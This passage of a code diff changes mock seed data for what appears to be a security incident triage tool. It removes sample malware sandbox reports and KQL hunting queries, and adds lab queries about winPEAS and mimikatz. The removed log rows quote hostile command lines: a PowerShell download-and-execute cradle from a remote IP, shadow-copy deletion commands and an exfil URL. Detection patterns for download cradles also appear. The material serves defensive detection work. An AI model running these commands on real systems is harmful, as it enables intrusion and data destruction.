-            "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
-            "c7f3a2e8b1d4f65a9c2eb8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1",
-        ]),
-    ),
-]
-
-
-MALWARE_ANALYSES = [
-    # --- Existing ---
-    MalwareAnalysis(
-        file_hash="9f2c6a9d4c1e5b3a8f7e2d9c6a4b3e1f0c8d7a6b5e4c3f2d1a0b9c8d7e6f5a4",
-        sandbox_score="92/100",
-        behavior_summary="Drops secondary payload, establishes C2 via HTTPS to 185.220.101.34, attempts credential harvesting.",
-        processes_spawned_json=json.dumps(["cmd.exe", "powershell.exe", "rundll32.exe"]),
-        registry_changes_json=json.dumps([
-            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc",
-            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MalSvc",
-        ]),
-        network_connections_json=json.dumps(["185.220.101.34:443", "185.220.101.34:8080"]),
-        persistence_detected=True,
-        credential_access_detected=True,
-        command_and_control_detected=True,
-        analysis_timestamp=datetime(2026, 2, 11, 15, 0, 0),
-    ),
-    MalwareAnalysis(
-        file_hash="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
-        sandbox_score="88/100",
-        behavior_summary="PowerShell download cradle fetches secondary payload from 91.215.85.142, executes in memory.",
-        processes_spawned_json=json.dumps(["powershell.exe", "conhost.exe"]),
-        registry_changes_json=json.dumps([
-            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\PsUpdate",
-        ]),
-        network_connections_json=json.dumps(["91.215.85.142:80", "91.215.85.142:443"]),
-        persistence_detected=True,
-        credential_access_detected=False,
-        command_and_control_detected=True,
-        analysis_timestamp=datetime(2026, 2, 13, 10, 0, 0),
-    ),
-    MalwareAnalysis(
-        file_hash="b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
-        sandbox_score="35/100",
-        behavior_summary="Legitimate Sysinternals PsExec tool used for remote administration. Dual-use risk.",
-        processes_spawned_json=json.dumps(["psexesvc.exe", "cmd.exe"]),
-        registry_changes_json=json.dumps([
-            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC",
-        ]),
-        network_connections_json=json.dumps(["10.14.2.27:445", "10.14.3.11:445"]),
-        persistence_detected=False,
-        credential_access_detected=False,
-        command_and_control_detected=False,
-        analysis_timestamp=datetime(2026, 2, 13, 17, 0, 0),
-    ),
-    # --- New ---
-    MalwareAnalysis(
-        file_hash="c7f3a2e8b1d4f65a9c2eb8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1",
-        sandbox_score="97/100",
-        behavior_summary="LockBit ransomware variant. Enumerates and encrypts files with AES-256, deletes shadow copies via vssadmin, drops ransom note in all directories, and attempts SMB lateral spread.",
-        processes_spawned_json=json.dumps(["vssadmin.exe", "cmd.exe", "net.exe", "wmic.exe"]),
-        registry_changes_json=json.dumps([
-            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe",
-            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LockBitUpdate",
-            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LockBitSvc",
-        ]),
-        network_connections_json=json.dumps(["10.14.4.10:445", "10.14.4.1:445", "10.14.4.255:445"]),
-        persistence_detected=True,
-        credential_access_detected=False,
-        command_and_control_detected=False,
-        analysis_timestamp=datetime(2026, 2, 15, 3, 0, 0),
-    ),
-    MalwareAnalysis(
-        file_hash="e1b4d7f0a3c6e9b2d5f8a1e4b7d0c3f6a9e2b5d8f1a4c7e0b3d6f9a2e5b8c1f4",
-        sandbox_score="95/100",
-        behavior_summary="WannaCry-variant worm exploits EternalBlue (CVE-2017-0144) to propagate via SMB port 445. Encrypts files after successful exploitation and scans the subnet for additional vulnerable hosts.",
-        processes_spawned_json=json.dumps(["mssecsvc.exe", "tasksche.exe", "cmd.exe", "attrib.exe", "icacls.exe"]),
-        registry_changes_json=json.dumps([
-            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\tasksche",
-            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssecsvc2.0",
-        ]),
-        network_connections_json=json.dumps(["10.14.6.19:445", "10.14.6.31:445", "10.14.6.42:445", "10.14.6.50:445"]),
-        persistence_detected=True,
-        credential_access_detected=False,
-        command_and_control_detected=False,
-        analysis_timestamp=datetime(2026, 2, 16, 8, 0, 0),
-    ),
-]
-
+MALWARE_ANALYSES = []
 
 KQL_QUERIES = [
-    # ---- FIN-WS-027 (Malicious Executable) ----
+    # ---- Aikaantivm / winPEASx64.exe (alert dad50712b6-...) ----
     KQLQuery(
-        query_name="Outbound C2 connections",
-        query_description="Detect outbound connections to known C2 IP from the affected device.",
-        kql_statement="DeviceNetworkEvents\n| where DeviceName == 'FIN-WS-027'\n| where RemoteIP == '185.220.101.34'\n| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName",
-        related_entity_type="device",
-        related_entity_id="FIN-WS-027",
-        execution_timestamp=datetime(2026, 2, 11, 15, 0, 0),
-        result_count=4,
-        result_columns_json=json.dumps(["Timestamp", "RemoteIP", "RemotePort", "InitiatingProcessFileName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-11 14:31:05", "185.220.101.34", "443", "supersusmalware.exe"],
-            ["2026-02-11 14:31:08", "185.220.101.34", "443", "supersusmalware.exe"],
-            ["2026-02-11 14:31:12", "185.220.101.34", "8080", "rundll32.exe"],
-            ["2026-02-11 14:31:30", "185.220.101.34", "443", "powershell.exe"],
-        ]),
-    ),
-    KQLQuery(
-        query_name="File write events",
-        query_description="Find all file creation events in the Downloads folder around the time of detection.",
-        kql_statement="DeviceFileEvents\n| where DeviceName == 'FIN-WS-027'\n| where FolderPath has 'Downloads'\n| where Timestamp between (datetime(2026-02-11 14:00) .. datetime(2026-02-11 15:00))\n| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName",
-        related_entity_type="device",
-        related_entity_id="FIN-WS-027",
-        execution_timestamp=datetime(2026, 2, 11, 15, 10, 0),
+        query_name="winPEASx64.exe execution history",
+        query_description="Find all executions of winPEASx64.exe on the affected device and its parent process chain.",
+        kql_statement=(
+            "DeviceProcessEvents\n"
+            "| where DeviceName == 'chrisr-lab-ws08.lab.local'\n"
+            "| where FileName == 'winPEASx64.exe' or InitiatingProcessFileName == 'winPEASx64.exe'\n"
+            "| where Timestamp between (datetime(2026-04-20 14:00) .. datetime(2026-04-20 16:00))\n"
+            "| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName, SHA256\n"
+            "| sort by Timestamp asc"
+        ),
+        related_entity_type="alert",
+        related_entity_id="dad50712b6-e83b-41c8-827e-8af5873236be_1",
+        execution_timestamp=datetime(2026, 4, 20, 15, 30, 0),
         result_count=2,
-        result_columns_json=json.dumps(["Timestamp", "FileName", "FolderPath", "SHA256", "InitiatingProcessFileName"]),
+        result_columns_json=json.dumps(["Timestamp", "FileName", "ProcessCommandLine", "AccountName", "InitiatingProcessFileName", "SHA256"]),
         result_rows_json=json.dumps([
-            ["2026-02-11 14:31:02", "supersusmalware.exe", "C:\\Users\\ola\\Downloads\\", "fb554148...feab37", "chrome.exe"],
-            ["2026-02-11 14:31:04", "config.dat", "C:\\Users\\ola\\Downloads\\", "a3e8f201...9bc412", "supersusmalware.exe"],
+            ["2026-04-20 15:03:06", "winPEASx64.exe", 'winPEASx64.exe', "chrisr", "powershell.exe", "a5e3ded4dff907d728cdb22d85f0ebfe65895189bc1b13983d6687d46476efe0"],
+            ["2026-04-20 15:05:07", "winPEASx64.exe", 'winPEASx64.exe', "chrisr", "powershell.exe", "a5e3ded4dff907d728cdb22d85f0ebfe65895189bc1b13983d6687d46476efe0"],
         ]),
     ),
     KQLQuery(
-        query_name="Process execution timeline",
-        query_description="List all processes spawned on the device in the hour surrounding the incident.",
-        kql_statement="DeviceProcessEvents\n| where DeviceName == 'FIN-WS-027'\n| where Timestamp between (datetime(2026-02-11 14:00) .. datetime(2026-02-11 15:00))\n| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName\n| sort by Timestamp asc",
-        related_entity_type="device",
-        related_entity_id="FIN-WS-027",
-        execution_timestamp=datetime(2026, 2, 11, 15, 15, 0),
-        result_count=5,
-        result_columns_json=json.dumps(["Timestamp", "FileName", "ProcessCommandLine", "AccountName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-11 14:31:02", "chrome.exe", "chrome.exe --download", "ola.nordmann"],
-            ["2026-02-11 14:31:05", "supersusmalware.exe", "supersusmalware.exe", "ola.nordmann"],
-            ["2026-02-11 14:31:06", "cmd.exe", "cmd.exe /c whoami", "ola.nordmann"],
-            ["2026-02-11 14:31:08", "powershell.exe", "powershell -enc SQBFAFgA...", "ola.nordmann"],
-            ["2026-02-11 14:31:12", "rundll32.exe", "rundll32.exe config.dat,Start", "ola.nordmann"],
-        ]),
-    ),
-
-    # ---- HR-LAPTOP-011 (PowerShell Download Cradle) ----
-    KQLQuery(
-        query_name="PowerShell download cradle activity",
-        query_description="Identify PowerShell processes using DownloadString or IEX patterns.",
-        kql_statement="DeviceProcessEvents\n| where FileName == 'powershell.exe'\n| where ProcessCommandLine has_any ('DownloadString', 'IEX', 'Invoke-Expression')\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
-        related_entity_type="device",
-        related_entity_id="HR-LAPTOP-011",
-        execution_timestamp=datetime(2026, 2, 13, 10, 30, 0),
-        result_count=2,
-        result_columns_json=json.dumps(["Timestamp", "DeviceName", "AccountName", "ProcessCommandLine"]),
-        result_rows_json=json.dumps([
-            ["2026-02-13 09:15:02", "HR-LAPTOP-011", "kari.hansen", "IEX (New-Object Net.WebClient).DownloadString('http://91.215.85.142/payload')"],
-            ["2026-02-13 09:15:18", "HR-LAPTOP-011", "kari.hansen", "powershell -enc JABjAD0ATgBlAHcALQBPAGIA..."],
-        ]),
-    ),
-    KQLQuery(
-        query_name="Network connections from PowerShell",
-        query_description="Find all outbound network connections initiated by PowerShell on the device.",
-        kql_statement="DeviceNetworkEvents\n| where DeviceName == 'HR-LAPTOP-011'\n| where InitiatingProcessFileName == 'powershell.exe'\n| project Timestamp, RemoteIP, RemotePort, RemoteUrl",
-        related_entity_type="device",
-        related_entity_id="HR-LAPTOP-011",
-        execution_timestamp=datetime(2026, 2, 13, 10, 35, 0),
-        result_count=5,
-        result_columns_json=json.dumps(["Timestamp", "RemoteIP", "RemotePort", "RemoteUrl"]),
-        result_rows_json=json.dumps([
-            ["2026-02-13 09:15:03", "91.215.85.142", "80", "http://91.215.85.142/payload"],
-            ["2026-02-13 09:15:05", "91.215.85.142", "80", "http://91.215.85.142/config"],
-            ["2026-02-13 09:15:20", "91.215.85.142", "443", "https://91.215.85.142/c2"],
-            ["2026-02-13 09:16:01", "91.215.85.142", "443", "https://91.215.85.142/exfil"],
-            ["2026-02-13 09:17:30", "91.215.85.142", "443", "https://91.215.85.142/c2"],
-        ]),
-    ),
-    KQLQuery(
-        query_name="Email attachment origin",
-        query_description="Trace the email attachment that delivered the malicious script to the user.",
-        kql_statement="EmailAttachmentInfo\n| where RecipientEmailAddress == 'kari.hansen@company.com'\n| where FileName == 'update_check.ps1'\n| project Timestamp, SenderFromAddress, Subject, FileName, SHA256",
-        related_entity_type="device",
-        related_entity_id="HR-LAPTOP-011",
-        execution_timestamp=datetime(2026, 2, 13, 10, 40, 0),
+        query_name="Files dropped to C:\\ProgramData\\legit",
+        query_description="Identify all file creation events in the suspicious staging directory used to host winPEASx64.exe.",
+        kql_statement=(
+            "DeviceFileEvents\n"
+            "| where DeviceName == 'chrisr-lab-ws08.lab.local'\n"
+            r"| where FolderPath startswith @'C:\ProgramData\legit'" + "\n"
+            "| where Timestamp between (datetime(2026-04-20 14:00) .. datetime(2026-04-20 16:00))\n"
+            "| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, AccountName\n"
+            "| sort by Timestamp asc"
+        ),
+        related_entity_type="alert",
+        related_entity_id="dad50712b6-e83b-41c8-827e-8af5873236be_1",
+        execution_timestamp=datetime(2026, 4, 20, 15, 35, 0),
         result_count=1,
-        result_columns_json=json.dumps(["Timestamp", "SenderFromAddress", "Subject", "FileName", "SHA256"]),
+        result_columns_json=json.dumps(["Timestamp", "FileName", "FolderPath", "SHA256", "InitiatingProcessFileName", "AccountName"]),
         result_rows_json=json.dumps([
-            ["2026-02-13 09:12:44", "it-support@c0mpany-updates.com", "Urgent: System Update Required", "update_check.ps1", "a1b2c3d4...f0a1b2"],
+            ["2026-04-20 15:02:50", "winPEASx64.exe", r"C:\ProgramData\legit", "a5e3ded4dff907d728cdb22d85f0ebfe65895189bc1b13983d6687d46476efe0", "powershell.exe", "chrisr"],
         ]),
     ),
-
-    # ---- IT-ADMIN-004 (Lateral Movement via PsExec) ----
+    # ---- Mimikatz / lateral movement (alert da411feb4c-...) ----
     KQLQuery(
-        query_name="PsExec lateral movement",
-        query_description="Track PsExec service installation events across the network.",
-        kql_statement="DeviceProcessEvents\n| where FileName == 'psexesvc.exe' or InitiatingProcessFileName == 'psexec.exe'\n| project Timestamp, DeviceName, AccountName, FileName, RemoteDeviceName",
-        related_entity_type="device",
-        related_entity_id="IT-ADMIN-004",
-        execution_timestamp=datetime(2026, 2, 13, 17, 0, 0),
-        result_count=4,
-        result_columns_json=json.dumps(["Timestamp", "DeviceName", "AccountName", "FileName", "RemoteDeviceName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-13 16:45:01", "IT-ADMIN-004", "admin.svc", "psexec.exe", "FIN-WS-027"],
-            ["2026-02-13 16:45:02", "FIN-WS-027", "SYSTEM", "psexesvc.exe", ""],
-            ["2026-02-13 16:47:00", "IT-ADMIN-004", "admin.svc", "psexec.exe", "HR-LAPTOP-011"],
-            ["2026-02-13 16:47:01", "HR-LAPTOP-011", "SYSTEM", "psexesvc.exe", ""],
-        ]),
-    ),
-    KQLQuery(
-        query_name="SMB connections from admin workstation",
-        query_description="List all SMB (port 445) connections originating from the admin workstation.",
-        kql_statement="DeviceNetworkEvents\n| where DeviceName == 'IT-ADMIN-004'\n| where RemotePort == 445\n| project Timestamp, RemoteIP, RemoteDeviceName, InitiatingProcessFileName, AccountName",
-        related_entity_type="device",
-        related_entity_id="IT-ADMIN-004",
-        execution_timestamp=datetime(2026, 2, 13, 17, 5, 0),
-        result_count=4,
-        result_columns_json=json.dumps(["Timestamp", "RemoteIP", "RemoteDeviceName", "InitiatingProcessFileName", "AccountName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-13 16:44:58", "10.14.2.27", "FIN-WS-027", "psexec.exe", "admin.svc"],
-            ["2026-02-13 16:45:02", "10.14.2.27", "FIN-WS-027", "psexec.exe", "admin.svc"],
-            ["2026-02-13 16:46:55", "10.14.3.11", "HR-LAPTOP-011", "psexec.exe", "admin.svc"],
-            ["2026-02-13 16:47:01", "10.14.3.11", "HR-LAPTOP-011", "psexec.exe", "admin.svc"],
-        ]),
-    ),
-    KQLQuery(
-        query_name="Service account logon activity",
-        query_description="Review all logon events for the admin service account across the environment.",
-        kql_statement="IdentityLogonEvents\n| where AccountUpn == 'admin.svc@company.com'\n| summarize count() by DeviceName, LogonType, bin(Timestamp, 1h)\n| sort by Timestamp desc",
-        related_entity_type="device",
-        related_entity_id="IT-ADMIN-004",
-        execution_timestamp=datetime(2026, 2, 13, 17, 10, 0),
-        result_count=4,
-        result_columns_json=json.dumps(["DeviceName", "LogonType", "Timestamp", "count_"]),
-        result_rows_json=json.dumps([
-            ["IT-ADMIN-004", "Interactive", "2026-02-13 16:00", "3"],
-            ["FIN-WS-027", "RemoteInteractive", "2026-02-13 16:00", "4"],
-            ["HR-LAPTOP-011", "RemoteInteractive", "2026-02-13 16:00", "2"],
-            ["IT-ADMIN-004", "Network", "2026-02-13 15:00", "19"],
-        ]),
-    ),
-
-    # ---- FILE-SRV-002 (Ransomware) ----
-    KQLQuery(
-        query_name="Mass file encryption events",
-        query_description="Detect mass file rename events indicating ransomware encryption activity.",
-        kql_statement="DeviceFileEvents\n| where DeviceName == 'FILE-SRV-002'\n| where ActionType == 'FileRenamed'\n| where FileName endswith '.lockbit'\n| summarize count() by bin(Timestamp, 1m), InitiatingProcessFileName\n| sort by Timestamp asc",
-        related_entity_type="device",
-        related_entity_id="FILE-SRV-002",
-        execution_timestamp=datetime(2026, 2, 15, 3, 0, 0),
-        result_count=4,
-        result_columns_json=json.dumps(["Timestamp", "count_", "InitiatingProcessFileName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-15 02:11:00", "487", "winupdate32.exe"],
-            ["2026-02-15 02:11:01", "1024", "winupdate32.exe"],
-            ["2026-02-15 02:11:02", "891", "winupdate32.exe"],
-            ["2026-02-15 02:11:03", "445", "winupdate32.exe"],
-        ]),
-    ),
-    KQLQuery(
-        query_name="Shadow copy deletion",
-        query_description="Detect vssadmin or wmic commands used to delete volume shadow copies, a common ransomware indicator.",
-        kql_statement="DeviceProcessEvents\n| where DeviceName == 'FILE-SRV-002'\n| where FileName in ('vssadmin.exe', 'wmic.exe')\n| where ProcessCommandLine has_any ('delete shadows', 'shadowcopy delete')\n| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName",
-        related_entity_type="device",
-        related_entity_id="FILE-SRV-002",
-        execution_timestamp=datetime(2026, 2, 15, 3, 5, 0),
-        result_count=2,
-        result_columns_json=json.dumps(["Timestamp", "FileName", "ProcessCommandLine", "AccountName", "InitiatingProcessFileName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-15 02:11:05", "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "SYSTEM", "winupdate32.exe"],
-            ["2026-02-15 02:11:07", "wmic.exe", "wmic shadowcopy delete /nointeractive", "SYSTEM", "winupdate32.exe"],
-        ]),
-    ),
-    KQLQuery(
-        query_name="Ransomware process timeline",
-        query_description="Reconstruct the full process execution timeline on the file server around the ransomware event.",
-        kql_statement="DeviceProcessEvents\n| where DeviceName == 'FILE-SRV-002'\n| where Timestamp between (datetime(2026-02-15 02:00) .. datetime(2026-02-15 03:00))\n| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName\n| sort by Timestamp asc",
-        related_entity_type="device",
-        related_entity_id="FILE-SRV-002",
-        execution_timestamp=datetime(2026, 2, 15, 3, 10, 0),
-        result_count=6,
-        result_columns_json=json.dumps(["Timestamp", "FileName", "ProcessCommandLine", "AccountName"]),
-        result_rows_json=json.dumps([
-            ["2026-02-15 02:10:01", "winupdate32.exe", "winupdate32.exe", "SYSTEM"],
-            ["2026-02-15 02:10:03", "cmd.exe", "cmd.exe /c whoami && net localgroup administrators", "SYSTEM"],
-            ["2026-02-15 02:10:08", "net.exe", "net use \\\\10.14.4.10\\C$ /user:svc.backup ****", "SYSTEM"],
-            ["2026-02-15 02:11:05", "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "SYSTEM"],
-            ["2026-02-15 02:11:07", "wmic.exe", "wmic shadowcopy delete /nointeractive", "SYSTEM"],
-            ["2026-02-15 02:11:10", "cmd.exe", "cmd.exe /c copy LOCKBIT-README.txt C:\\Users\\Public\\", "SYSTEM"],
-        ]),
-    ),
-
-    # ---- DEV-WS-015 (Network Worm) ----
-    KQLQuery(
-        query_name="SMB exploit scan activity",
-        query_description="Detect port 445 scanning behavior from the infected workstation across the subnet.",
-        kql_statement="DeviceNetworkEvents\n| where DeviceName == 'DEV-WS-015'\n| where RemotePort == 445\n| where ActionType == 'ConnectionAttempted'\n| summarize count() by bin(Timestamp, 1m), RemoteIP\n| sort by Timestamp asc",
-        related_entity_type="device",
-        related_entity_id="DEV-WS-015",
-        execution_timestamp=datetime(2026, 2, 16, 8, 0, 0),
-        result_count=6,
-        result_columns_json=json.dumps(["Timestamp", "count_", "RemoteIP"]),
-        result_rows_json=json.dumps([
-            ["2026-02-16 07:01:00", "4", "10.14.6.19"],
-            ["2026-02-16 07:01:00", "4", "10.14.6.31"],
-            ["2026-02-16 07:01:00", "4", "10.14.6.42"],
-            ["2026-02-16 07:01:00", "4", "10.14.6.50"],
-            ["2026-02-16 07:01:00", "4", "10.14.6.63"],
-            ["2026-02-16 07:01:00", "4", "10.14.6.71"],
-        ]),
-    ),
-    KQLQuery(
-        query_name="Worm propagation targets",
-        query_description="Identify hosts that received successful SMB exploit connections from the worm-infected device.",
-        kql_statement="DeviceNetworkEvents\n| where DeviceName == 'DEV-WS-015'\n| where RemotePort == 445\n| where ActionType == 'ConnectionSuccess'\n| project Timestamp, RemoteIP, RemoteDeviceName, InitiatingProcessFileName",
-        related_entity_type="device",
-        related_entity_id="DEV-WS-015",
-        execution_timestamp=datetime(2026, 2, 16, 8, 5, 0),
+        query_name="mimikatz.exe process tree",
+        query_description="Show the full process chain for mimikatz.exe to understand how it was launched and what it targeted.",
+        kql_statement=(
+            "DeviceProcessEvents\n"
+            "| where DeviceName == 'chrisr-lab-ws08.lab.local'\n"
+            "| where FileName in ('mimikatz.exe', 'lsass.exe', 'powershell.exe')\n"
+            "| where Timestamp between (datetime(2026-04-20 14:00) .. datetime(2026-04-20 16:00))\n"
+            "| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName, SHA256\n"
+            "| sort by Timestamp asc"
+        ),
+        related_entity_type="alert",
+        related_entity_id="da411feb4c-4ffd-4162-9d5d-f7799f1baf4b_1",
+        execution_timestamp=datetime(2026, 4, 20, 15, 20, 0),
         result_count=3,
-        result_columns_json=json.dumps(["Timestamp", "RemoteIP", "RemoteDeviceName", "InitiatingProcessFileName"]),
+        result_columns_json=json.dumps(["Timestamp", "FileName", "ProcessCommandLine", "AccountName", "InitiatingProcessFileName", "SHA256"]),
         result_rows_json=json.dumps([
-            ["2026-02-16 07:01:15", "10.14.6.19", "DEV-WS-016", "mssecsvc.exe"],
-            ["2026-02-16 07:01:22", "10.14.6.31", "DEV-WS-019", "mssecsvc.exe"],
-            ["2026-02-16 07:02:10", "10.14.6.42", "DEV-WS-022", "mssecsvc.exe"],
+            ["2026-04-20 14:49:51", "mimikatz.exe", '"mimikatz.exe"', "chrisr", "powershell.exe", "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1"],
+            ["2026-04-20 14:50:02", "lsass.exe", "lsass.exe", "SYSTEM", "wininit.exe", "055a1226a769948a79ed0972bdee2d91937c4b521e0b9046f9b8ccc63d110115"],
+            ["2026-04-20 15:14:22", "mimikatz.exe", '"mimikatz.exe"', "chrisr", "powershell.exe", "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1"],
         ]),
     ),
     KQLQuery(
-        query_name="Dropped worm components",
-        query_description="List all files dropped by the worm process on the infected device.",
-        kql_statement="DeviceFileEvents\n| where DeviceName == 'DEV-WS-015'\n| where ActionType == 'FileCreated'\n| where InitiatingProcessFileName in ('mssecsvc.exe', 'tasksche.exe')\n| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName",
-        related_entity_type="device",
-        related_entity_id="DEV-WS-015",
-        execution_timestamp=datetime(2026, 2, 16, 8, 10, 0),
-        result_count=4,
-        result_columns_json=json.dumps(["Timestamp", "FileName", "FolderPath", "SHA256", "InitiatingProcessFileName"]),
+        query_name="chrisr lateral movement (Apr 20)",
+        query_description="Identify network logon and remote execution events from chrisr on the day of the mimikatz detection.",
+        kql_statement=(
+            "IdentityLogonEvents\n"
+            "| where AccountUpn == 'chrisr@lab.local'\n"
+            "| where Timestamp between (datetime(2026-04-20 14:00) .. datetime(2026-04-20 17:00))\n"
+            "| project Timestamp, DeviceName, DestinationDeviceName, LogonType, Protocol, ActionType\n"
+            "| sort by Timestamp asc"
+        ),
+        related_entity_type="alert",
+        related_entity_id="da411feb4c-4ffd-4162-9d5d-f7799f1baf4b_1",
+        execution_timestamp=datetime(2026, 4, 20, 15, 25, 0),
+        result_count=3,
+        result_columns_json=json.dumps(["Timestamp", "DeviceName", "DestinationDeviceName", "LogonType", "Protocol", "ActionType"]),
         result_rows_json=json.dumps([
-            ["2026-02-16 07:00:06", "mssecsvc.exe", "C:\\Windows\\", "e1b4d7f0...c1f4", "SYSTEM"],
-            ["2026-02-16 07:00:07", "tasksche.exe", "C:\\Windows\\", "e2c5e8a1...d3f6", "mssecsvc.exe"],
-            ["2026-02-16 07:00:09", "u.wnry", "C:\\Windows\\", "a3f2d1c0...e4b7", "tasksche.exe"],
-            ["2026-02-16 07:00:11", "t.wnry", "C:\\Windows\\", "b4a3c2d1...f5e8", "tasksche.exe"],
+            ["2026-04-20 14:49:51", "chrisr-lab-ws08.lab.local", "chrisr-lab-ws08.lab.local", "Interactive", "Kerberos", "LogonSuccess"],
+            ["2026-04-20 15:03:06", "chrisr-lab-ws08.lab.local", "chrisr-lab-ws08.lab.local", "Interactive", "Kerberos", "LogonSuccess"],
+            ["2026-04-20 15:14:22", "chrisr-lab-ws08.lab.local", "chrisr-lab-ws08.lab.local", "Interactive", "Kerberos", "LogonSuccess"],
         ]),
     ),
-
 ]
 
 
@@ -874,13 +369,11 @@ def seed():
             session.add(cc)
         for ma in MALWARE_ANALYSES:
             session.add(ma)
-        for kq in KQL_QUERIES:
-            session.add(kq)
+        for kql in KQL_QUERIES:
+            session.add(kql)
+
         session.commit()
-        print(f"Seeded {len(INCIDENTS)} incidents, {len(FILE_INTELLIGENCE)} file intelligence, "
-              f"{len(DEVICE_CONTEXTS)} device contexts, {len(USER_CONTEXTS)} user contexts, "
-              f"{len(CAMPAIGN_CONTEXTS)} campaigns, {len(MALWARE_ANALYSES)} malware analyses, "
-              f"{len(KQL_QUERIES)} KQL queries.")
+        print("Seed data inserted successfully.")
 
 
 if __name__ == "__main__":
